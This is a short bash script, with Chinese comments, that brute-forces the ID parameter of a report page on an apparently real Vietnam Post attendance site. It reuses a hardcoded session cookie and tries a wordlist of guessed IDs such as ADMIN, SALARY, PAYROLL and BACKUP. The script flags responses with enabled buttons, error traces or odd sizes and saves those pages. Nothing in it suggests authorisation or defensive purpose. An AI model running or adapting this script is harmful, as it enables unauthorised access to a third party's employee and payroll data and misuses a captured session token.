#!/bin/bash

COOKIE="ASP.NET_SessionId=omtonrrfveu055ojf1dnmgwx"
BASE="http://vps.vnpost.vn/chamcong"

echo "🔥 死磕策略1: ID参数完整爆破"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 生成ID字典
cat > id_wordlist.txt << 'IDLIST'
MAU1
MAU2
MAU3
MAU4
MAU5
BCC1
BCC2
BCC3
REPORT1
REPORT2
ADMIN
TEST
DEMO
DEFAULT
MASTER
USER
STAFF
EMPLOYEE
MANAGER
HR
SALARY
WAGE
PAYROLL
ATTENDANCE
TIMESHEET
EXPORT
IMPORT
BACKUP
CONFIG
SETTINGS
SYSTEM
DATABASE
SERVER
CLIENT
VIP
SPECIAL
TEMP
TMP
DEBUG
DEV
PROD
PRODUCTION
UAT
STAGING
TEST1
TEST2
SAMPLE
EXAMPLE
TEMPLATE
FORMAT1
FORMAT2
MAU10
MAU20
MAU100
NVDH
VCKVDBB
KVMBTCVP
EOF
IDLIST

echo "[*] 测试 $(wc -l < id_wordlist.txt) 个ID..."

while read id; do
    echo -n "  测试 ID=$id: "
    
    resp=$(curl -sk "${BASE}/report/inBCC.aspx?ID=${id}" \
        -H "Cookie: $COOKIE" 2>&1)
    
    size=$(echo "$resp" | wc -c)
    
    # 检查是否激活功能
    if ! echo "$resp" | grep -qi "disabled"; then
        echo "🔥🔥🔥 按钮激活!"
        echo "$id" >> valid_ids_active.txt
        echo "$resp" > "ID_ACTIVE_${id}.html"
    # 检查是否有错误
    elif echo "$resp" | grep -qi "error\|exception\|stack"; then
        echo "⚠️  错误响应"
        echo "$id|ERROR" >> id_error_responses.txt
    # 检查大小差异
    elif [ $size -lt 3000 ] || [ $size -gt 6000 ]; then
        echo "❓ 异常大小: $size bytes"
        echo "$id|$size" >> id_unusual_sizes.txt
    else
        echo "- ($size bytes)"
    fi
done < id_wordlist.txt

echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 结果:"
ls -lh valid_ids_active.txt id_error_responses.txt id_unusual_sizes.txt 2>/dev/null
